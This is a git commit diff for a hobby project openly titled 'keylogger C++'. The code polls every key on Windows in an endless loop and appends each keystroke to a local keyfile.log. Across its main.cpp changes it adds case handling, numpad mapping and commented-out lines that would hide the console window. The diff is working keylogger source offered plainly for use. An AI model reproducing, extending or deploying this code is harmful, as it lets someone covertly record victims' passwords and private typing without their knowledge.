b8904539287057a38a14dbea40f397d28bf38e9b
COMLAN Giovanni <giovanni.comlan@yahoo.fr>
2018-03-13 22:37:45 +0100

    in progress i guess

--- C++/README.md
+++ C++/README.md
@@ -1,2 +1,5 @@
 # keylogger C++
 Almost done
+
+http://www.theasciicode.com.ar/extended-ascii-code/lowercase-letter-y-acute-accent-ascii-code-236.html
+https://msdn.microsoft.com/en-us/library/ms927178.aspx
--- C++/main.cpp
+++ C++/main.cpp
@@ -8,6 +8,19 @@
 
 using namespace std;
 
+
+void writeLog(int ckey)
+{
+    ofstream keyloggerSaveFile;
+    keyloggerSaveFile.open("keyfile.log", ofstream::app);
+
+    if (keyloggerSaveFile.is_open())
+    {
+        keyloggerSaveFile << char(ckey);
+        keyloggerSaveFile.close();
+    }
+}
+
 void writeSpecialLog(string keyInput)
 {
     ofstream keyloggerSaveFile;
@@ -20,92 +33,38 @@ void writeSpecialLog(string keyInput)
     }//NO NEED A ELSE STATMENT BECAUSE THE FILE  WILL BE CREATE IN ANY CASE
 }
 
-
 bool specialKeys(int sKey)
 {
     switch (sKey)
 
     {
-    /*IF U WANT MORE
+    /*
+    IF U WANT TO TRACK OTHERE VIRTUAL KEY !
     https://msdn.microsoft.com/en-us/library/ms927178.aspx
     */
-    case VK_LBUTTON:
-        cout << "#LEFTCLICK#" << endl;
-        writeSpecialLog("#LEFTCLICK#");
-        return true;
-        break;
-
-    case VK_RBUTTON	:
-        cout << "#RIGHTCLICK#" << endl;
-        writeSpecialLog("#RIGHTCLICK#");
-        return true;
-        break;
-
-    case VK_CAPITAL:
-        cout << "CAPITAL" << endl;
-        //writeSpecialLog("");
-        //NO REALY NEED IF U NEED JUST THE SIMPLE TEXT, NOT ALL INPUT
-        return true;
-        break;
-
-    case VK_SHIFT:
-        cout << "SHIFT" << endl;
-        //writeSpecialLog("");
-        //NO REALY NEED IF U NEED JUST THE SIMPLE TEXT, NOT ALL INPUT
-        return true;
-        break;
-
-    case VK_CONTROL:
-        //cout << "SHIFT" << endl;
-        //writeSpecialLog("");
-        //NO REALY NEED IF U NEED JUST THE SIMPLE TEXT, NOT ALL INPUT
-        return true;
-        break;
-
-    case VK_MENU:
-        //cout << "SHIFT" << endl;
-        //writeSpecialLog("");
-        //NO REALY NEED IF U NEED JUST THE SIMPLE TEXT, NOT ALL INPUT
-        return true;
-        break;
-
-    case VK_END:
-        cout << "END" << endl;
-        //writeSpecialLog("");
-        //NO REALY NEED IF U NEED JUST THE SIMPLE TEXT, NOT ALL INPUT
-        return true;
-        break;
-
-    case VK_LWIN:
-        cout << "lEFTWINDOWS" << endl;
-        //writeSpecialLog("");
-        //NO REALY NEED IF U NEED JUST THE SIMPLE TEXT, NOT ALL INPUT
-        return true;
-        break;
-
-    case VK_DELETE:
-        cout << "DEL" << endl;
-        //writeSpecialLog("#<Del>#");
-        return true;
-        break;
-
     case VK_RETURN:
-        cout << "\n" << endl;
+        //cout << "\n" << endl;
         writeSpecialLog("\n");
         return true;
         break;
 
     case VK_TAB:
-        cout << "TAB" << endl;
+        //cout << "TAB" << endl;
         writeSpecialLog("\t");
         return true;
         break;
 
     case VK_BACK:
-            cout << "#back#" << endl;
-            writeSpecialLog("#BACK#");
-            return true;
-            break;
+        cout << "#back#" << endl;
+        writeSpecialLog("#BACK#");
+        return true;
+        break;
+
+    case VK_NUMLOCK:
+        cout << "#VerrNum#" << endl;
+        writeSpecialLog("#verNum#");
+        return true;
+        break;
 
     default:
         return false;
@@ -118,62 +77,73 @@ int main()
 {
     //FreeConsole();
     //ShowWindow(GetConsoleWindow(), SW_HIDE);//Hide windows
-
     while (true)
     {
         Sleep(10);//INFINITE SLEEP FOR ACTIVE WINDOWS
         for (int key = 8; key <= 255; key++)//PUT 127 IF U WANT MINIMAL KEY
             //WE START AT BACKSPACE WHO IS 8 IN THE ASCII CODE
         {
-            if (GetAsyncKeyState(key) == -32767)//IF A TOUCH IS PRESS
+            if ((GetAsyncKeyState(key) == -32767) && (specialKeys(key) == false))//IF A TOUCH IS PRESS
             {
-                //IF WE DONT HAVE A SPECIFIC KEYS WE PRINT THE AUTHER KEY
-                if (specialKeys(key) == false)
+                //SSSSWWWIIITTTCCCCCCHH
+                if((key>64)&&(key<91)&&!(GetKeyState(VK_CAPITAL)))
+                    //GetKeyState(VK_CAPITAL) MEAN IF THE LOCK KEY IS ACTIVE
                 {
-                    ofstream keyloggerSaveFile;
-                    keyloggerSaveFile.open("keyfile.log", ofstream::app);
+                    key+=32;
+                    writeLog(key);
 
-                    if (keyloggerSaveFile.is_open())
-                    {
-                        //ALL THOS IS MAD WITH MY OWN KEYBOARD DON'T KNOW  IF THIS WILL WORK ON OTHER KEYBOARD
-                        if((key>64)&&(key<91)&&!(GetKeyState(VK_CAPITAL)))
-                            //GetKeyState(VK_CAPITAL) MEAN IF THE LOCK KEY IS ACTIVE
-                        {
-                            key+=32;
-                            keyloggerSaveFile << char(key);//CHAR(27) FOR EXEMPLE IS ESCAPE
-                            //cout << char(key) << endl;
-                            keyloggerSaveFile.close();
-                        }
-                        else if ((key>95)&&(key<104)&&(GetKeyState(VK_NUMLOCK)))
-                        {
-                            key-=48;//ON THE ASCII TABLE THE DIFFERENCE IS 47
-                            keyloggerSaveFile << char(key);
-                            keyloggerSaveFile.close();
 
-                        }
-                        /*
-                        else if ((key>95)&&(key<104)&&!(GetKeyState(VK_NUMLOCK)))
-                        {
-                            key-=48;//ON THE ASCII TABLE THE DIFFERENCE IS 47
-                            keyloggerSaveFile << char(key);
-                            keyloggerSaveFile.close();
-
-                        }
-                        */
-                        else if (key == 222)
-                        {
-                            keyloggerSaveFile << '²';
-                            keyloggerSaveFile.close();
-                        }
-                        //else
-                        //{
-                        //keyloggerSaveFile << char(key);
-                        //cout << key << endl;
-                        //keyloggerSaveFile.close();
-
-                        //}
-                    }
                 }
+                else if((key>64)&&(key<91))
+                    //GetKeyState(VK_CAPITAL) MEAN IF THE LOCK KEY IS ACTIVE
+                {
+                    writeLog(key);
+
+                }
+
+
+                else if ((key>95)&&(key<106)&&(GetKeyState(VK_NUMLOCK)))
+                {
+                    //cout << key << endl;
+                    key-=48;//ON THE ASCII TABLE THE DIFFERENCE IS 47
+                    writeLog(key);
+                }
+                else if ((key == 110)&&(GetKeyState(VK_NUMLOCK)))
+                {
+                    key-=64;
+                    writeLog(key);
+
+                }
+                else if ((key == 46)&&!(GetKeyState(VK_NUMLOCK)))
+                {
+                    writeSpecialLog("#BACK#");
+                }
+                else if (key == 111)
+                {
+                    //64
+                    writeSpecialLog("/");
+                }
+                else if (key == 106)
+                {
+                    //64
+                    writeSpecialLog("*");
+                }
+                else if (key == 109)
+                {
+                    //62
+                    writeSpecialLog("-");
+                }
+
+                else if (key == 107)
+                {
+                    //64
+                    writeSpecialLog("+");
+                }
+                else
+                {
+                    cout << key << endl;
+                }
+
             }
         }
     }
